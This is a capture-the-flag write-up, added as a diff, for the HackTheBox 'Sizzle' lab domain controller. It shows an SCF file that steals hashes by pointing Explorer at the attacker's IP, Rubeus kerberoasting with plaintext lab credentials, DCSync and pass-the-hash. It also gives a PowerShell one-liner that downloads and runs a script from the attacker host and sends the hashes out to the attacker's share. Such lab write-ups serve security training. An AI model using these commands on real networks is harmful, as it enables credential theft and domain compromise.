@@ -1,0 +1,355 @@
+### Summary
+- A **Windows Domain Controller** machine. We find an **SMB share** containing a *writable* folder called `Public`. We place an `SCF` file there that *directs the visiting user's computer* to our listening `responder` where we capture his `NTLMv2` hash.
+- *After cracking it,* we get the password for the `amanda` user which we use to enumerate the domain using `BloodHound`.
+- *Noticing that our user has* **PowerShell Remoting** *capabilities,* we try to gain access but are faced with a *strange authentication error*.
+- *Upon inspecting the functionality of the* `Evil-Winrm` *tool,* we find that we can use a *certificate* for logging in.
+- We create a **Certificate Signing Request** using `openssl` and get it signed from the **ADCS Web Interface** found on the domain controller.
+- *Using* `evil-winrm`'*s ability to authenticate using SSL certificates,* we successfully achieve code execution.
+- Looking back at the output of `BloodHound` showed a *kerberoastable* user called `mrlky` that has dangerous rights abusable for a `DCSync` attack.
+- We decide to use `Rubeus.exe` to do the job but can't execute it due to **Applocker** restrictions.
+- We bypass by moving it to the Windows `temp` folder and are faced with another error requiring us to authenticate to the network.
+- We add the `amanda`'s credentials as flags to the `Rubeus` tool and manage to kerberoast `mrkly`.
+- We crack his `TGS` hash and are able to get the password. We then proceed to `DCSync` and obtain the `NTLM hash` for the `administrator` account and `PTH` to gain complete access.
+- Bonus: Bypassing **PowerShell Contrained Language Mode**, dodging **Applocker**, **authenticating** to the network and **Kerberoasting** all in a **one-liner** and *without touching disk*.
+- Joke Section: Pwning the box with **ZeroLogon** XD
+
+---
+
+### Nmap
+The nmap output gives some good information:
+- **Machine Name:** Sizzle
+- **Domain Name:** HTB.local
+- **FTP** with *anonymous* login allowed
+- **IIS** 10.0 on port 80 which indicates server 2016+ or windows 10
+- **SMB** on port 445
+- **LDAP** and **GC** on ports 389 and 3268
+- **WinRM** on 5985/5986 which is always nice to have
+
+```
+PORT      STATE SERVICE       VERSION
+21/tcp    open  ftp           Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-title: Site doesn't have a title (text/html).
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
+|_ssl-date: 2022-04-30T19:56:16+00:00; -1s from scanner time.
+| ssl-cert: Subject: commonName=sizzle.htb.local
+| Not valid before: 2018-07-03T17:58:55
+|_Not valid after:  2020-07-02T17:58:55
+443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
+|_ssl-date: 2022-04-30T19:56:16+00:00; 0s from scanner time.
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Site doesn't have a title (text/html).
+| ssl-cert: Subject: commonName=sizzle.htb.local
+| Not valid before: 2018-07-03T17:58:55
+|_Not valid after:  2020-07-02T17:58:55
+| http-methods: 
+|_  Potentially risky methods: TRACE
+| tls-alpn: 
+|   h2
+|_  http/1.1
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=sizzle.htb.local
+| Not valid before: 2018-07-03T17:58:55
+|_Not valid after:  2020-07-02T17:58:55
+|_ssl-date: 2022-04-30T19:56:16+00:00; 0s from scanner time.
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=sizzle.htb.local
+| Not valid before: 2018-07-03T17:58:55
+|_Not valid after:  2020-07-02T17:58:55
+|_ssl-date: 2022-04-30T19:56:16+00:00; 0s from scanner time.
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=sizzle.htb.local
+| Not valid before: 2018-07-03T17:58:55
+|_Not valid after:  2020-07-02T17:58:55
+|_ssl-date: 2022-04-30T19:56:16+00:00; 0s from scanner time.
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
+| Subject Alternative Name: othername:<unsupported>, DNS:sizzle.HTB.LOCAL
+| Not valid before: 2018-07-02T20:26:23
+|_Not valid after:  2019-07-02T20:26:23
+|_http-server-header: Microsoft-HTTPAPI/2.0
+| tls-alpn: 
+|   h2
+|_  http/1.1
+|_ssl-date: 2022-04-30T19:56:16+00:00; -1s from scanner time.
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49677/tcp open  msrpc         Microsoft Windows RPC
+49686/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49688/tcp open  msrpc         Microsoft Windows RPC
+49689/tcp open  msrpc         Microsoft Windows RPC
+49692/tcp open  msrpc         Microsoft Windows RPC
+49698/tcp open  msrpc         Microsoft Windows RPC
+49707/tcp open  msrpc         Microsoft Windows RPC
+49713/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2022-04-30T19:55:42
+|_  start_date: 2022-04-30T19:49:45
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+```
+
+### Anonymous FTP
+No files were there, and we're not granted `write` access either. So we move on.
+
+![Anon-FTP-no-write](Anon-FTP-no-write.jpg)
+
+### HTTP/HTTPs
+The home page just shows a `GIF` of bacon sizzling...
+
+![http-homepage](http-homepage.jpg)
+
+Spidering with `gobuster` shows an interesting directory `/certsrv` which indicates that the **ADCS role** is installed on this server. We note this down.
+
+![gobuser-output](gobuser-output.jpg)
+
+the **HTTPS** website is similar in structure. so we move along.
+
+### LDAP
+The output of `ldapsearch` didn't show much information. 
+
+![ldapsearch-output](ldapsearch-output.jpg)
+
+(*I grepped out some unnecessary lines from the output to make it smaller.*)
+
+### SMB
+Enumerating SMB with `crackmapexec` reveals that we have `read` access to the `Department Shares` folder.
+
+![cme-smb-share-enum](cme-smb-share-enum.jpg)
+
+*After mounting it,* we notice a couple of folders:
+
+![dpt-shares-folders](dpt-shares-folders.jpg)
+
+the `Users` folder contained some usernames which we save in a list for later use:
+
+![userlist-from-smb](userlist-from-smb.jpg)
+
+We find some files in the `ZZ_ARCHIVE` folder but they dont have any content:
+
+![zz-archive-files](zz-archive-files.jpg)
+
+we loop over the files using the `file` command and `grep` out any empty hex line with `xxd` to find nothing there as well.
+
+![checking_zz_archive](checking_zz_archive.jpg)
+
+*Since we were nearing a dead end with our enumeration,* we're going to use a simple `bash` script to check for `write` access in the SMB share.
+
+```
+#!/bin/bash
+list=$(find /mnt -type d)
+for d in $list
+do
+        touch $d/just-a-test-dir 2>/dev/null
+        if [ $? -eq 0 ]
+        then
+                echo -e "\e[32m[+] $d is writable\e[0m"
+                rm $d/just-a-test-dir
+        else
+                echo -e "\e[31m[-] $d is not writable\e[0m"
+        fi
+done
+```
+
+1. it does a `find` on the mount point with the `-type d` flag to get *only directories*.
+2. then attempts to create a file in each one using `touch`
+3. It prints out if the folder is writable or not
+4. then clears the test file if the folder is writable.
+
+![check-write-script-results](check-write-script-results.jpg)
+
+The results show that we have `write` access in both the `Public` and `ZZ_ARCHIVE` folders.
+
+Having this access would allow us to *plant a malicious type of file* that would enable us to *steal* **NTLMv2 hashes** from users who access these locations.
+
+### SCF File Attacks for Hash Theft
+SCF (Shell Command Files) are files that can perform actions in **Windows Explorer**. One functionality can be *abused* to have the *share-visiting* user *directed* to our kali machine.
+
+This can be done using a file with the below content:
+
+```
+[Shell]
+Command=2
+IconFile=\\10.10.16.7\share\pwn.ico
+[Taskbar]
+Command=ToggleDesktop
+```
+
+*Essentially,* this tells **File Explorer** to *fetch* the icon for the `.scf` file from a network share (*our kali box in this case*).
+
+We're going to fire up `responder` making sure the `Responder.conf` file has the `SMB` server set to `ON`.
+
+And then copy the `.scf` file to `\\10.10.10.103\Department Shares\Users\Public` as well as the `ZZ_ARCHIVE` folders to make sure any visitor gives us his/her hash.
+
+![amanda-hash-captured](amanda-hash-captured.jpg)
+
+We manage to get a response from the `amanda` user right away :D
+
+We then get to cracking with `john`
+
+![amanda-hash-cracked](amanda-hash-cracked.jpg)
+
+the password turns out to be `Ashare1972`
+
+### The WinRM situation
+We first validate the creds for `amanda` with `crackmapexec` via SMB and they work.
+
+So we try WinRM after but end up with a weird error message:
+
+![cme-smb-yes-winrm-no](cme-smb-yes-winrm-no.jpg)
+
+at this moment, I wasn't quite sure what to do. So I moved on to try other things.
+
+### Domain Enumeration With BloodHound.py
+*Since I didn't have code execution,* I turned to the **Python** version of `BloodHound` to do enumeration with all collection methods:
+
+![bloodhound-py](bloodhound-py.jpg)
+
+*Viewing the* `amanda` *user,* I saw she did have **PowerShell Remoting** capability when I ran the `Shortest Path from Owned Principles` query.
+
+![amanda-can-ps-remote](amanda-can-ps-remote.jpg)
+
+### Getting WinRM to work
+*Since we have access to the* `amanda` *user's credentials,* we can *request* a **User Certificate** from **AD Certificate Services.**
+
+This can be done after authenticating to `http://10.10.10.103/certsrv` and submitting a **Certificate Signing Request** (**CSR** for short).
+
+*Before visiting the* **ADCS** *page,* we would need to get a **key** and a **CSR**. This can be done using `openssl`.
+
+The command should be as below:
+
+`openssl req -newkey rsa:2048 -keyout amanda.key -out amanda.csr`
+
+![gen-key-gen-csr](gen-key-gen-csr.jpg)
+
+Note the contents of the `.csr` file:
+
+![amanda-csr](amanda-csr.jpg)
+
+We now visit the page:
+
+![cert-srv-1](cert-srv-1.jpg)
+
+![cert-srv-2](cert-srv-2.jpg)
+
+we then paste what we copied from `amanda.csr`
+
+![cert-srv-3](cert-srv-3.jpg)
+
+And we select the **Base 64 encoded version** and download it.
+
+![cert-srv-4](cert-srv-4.jpg)
+
+*Having done all this,* we just need to hook both the `.key` file and the `.cer` we got from **ADCS** to `evil-winrm` while using the `-S` flag for SSL.
+
+We know so from checking the help:
+
+![evil-winrm-help](evil-winrm-help.jpg)
+
+And it works like a charm :D
+
+![winrm-success-amanda](winrm-success-amanda.jpg)
+
+Note: the PEM pass phrase is the one you were asked to enter when generating the private key and CSR with `openssl`
+
+### Back to `BloodHound` graphs: Kerberoastable Users
+Inspecting the query `List all Kerberoastable Accounts` shows us that a user called `mrlky` is vulnerable.
+
+![mrlky-kerberoastable](mrlky-kerberoastable.jpg)
+
+That user is very special since he has the 2 required rights to perform a `DCSync` attack:
+1. `GetChanges`
+2. `GetChangesAll`
+
+![mrlky-can-dcsync](mrlky-can-dcsync.jpg)
+
+*Hence,* we need to kerberoast this guy and get his TGS hash :D
+
+### Roasting with Rubeus: Bypassing Applocker and Performing Network Authentication
+*After copying* `Rubeus.exe` *from our kali machine over to* `amanda`'*s documents folder*, we find that we can't execute due to **Applocker.**
+
+![rubeus-applocked](rubeus-applocked.jpg)
+
+Moving it to `c:\windows\temp` directory works as a bypass. But we get another error:
+
+![rubeus-no-net-logon](rubeus-no-net-logon.jpg)
+
+This is because we logged in using a different way: user certificate.
+
+*In order to carry out this attack,* we would need to authenticate to the network.
+
+This can be done using the `/creduser`, `/credpassword` and `/domain` switches in `Rubeus.exe`.
+
+The command is: `.\rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972 /domain:htb.local`
+
+![mrlky-kerberoasted](mrlky-kerberoasted.jpg)
+
+We're good! :D
+
+Now we crack the hash for `mrkly` again with `john`:
+
+![mrlky-cracked](mrlky-cracked.jpg)
+
+### DCSync
+*Having the password for* `mrkly`: `Football#7`, we're going to use `Impacket`'s `secretsdump.py` python script to do a `DCSync` attack:
+
+![dcsynced](dcsynced.jpg)
+
+and follow up with `psexec.py` for a quick **Pass-The-Hash** attack to get code execution as `NT Authority\System`:
+
+![got-system](got-system.jpg)
+
+### Bonus: PowerShell Contrained Language Mode, Bypassing it along with Applocker and Kerberoasting without touching disk. All in a PowerShell one-liner :D
+After I initially got the WinRM shell, It kept asking for my PEM pass phrase after each command.
+
+I wanted to get a `nishang` shell but couldn't do the `IEX` command (`Invoke-Expression`). This was because of **PowerShell's Contrained Language Mode**.
+
+![constrained-language-mode](constrained-language-mode.jpg)
+
+**Contrained Language Mode** disables a few PowerShell commands that can be dangerous.
+
+*Fortunately,* it can be bypassed by *downgrading* to **PowerShell** version 2.
+
+We're going to be abusing the `Start-Process` command to start a `powershell.exe` with `-v 2` and the command `-c IEX(New-Object Net.webClient).downloadString('http://10.10.16.7/Invoke-Kerberoast.ps1')` as arguments.
+
+This is to:
+1. Start a **PowerShell** version 2 process without locking the terminal.
+1. Import the `Invoke-Kerberoast` code into memory.
+2. Execute the command `Invoke-Kerberoast -OutputFormat john | % { $_.Hash } | Out-File -Encoding ASCII \\10.10.16.7\share\roasted.txt`.
+3. Output the TGS hash of the `mrlky` user to our SMB share.
+
+we will use the `-Credential` paramer with `Start-Process` to create the Network Authentication needed for the attack to succeed.
+
+*That way,* we've hit multiple birds with one stone.
+1. We never had to deal with **Applocker**
+2. Dodged **Contrained Language Mode**
+3. Created the needed **Network Logon**
+4. **Kerberoasted** *without ever touching the victim's disk*
+
+![bonus-kill](bonus-kill.jpg)
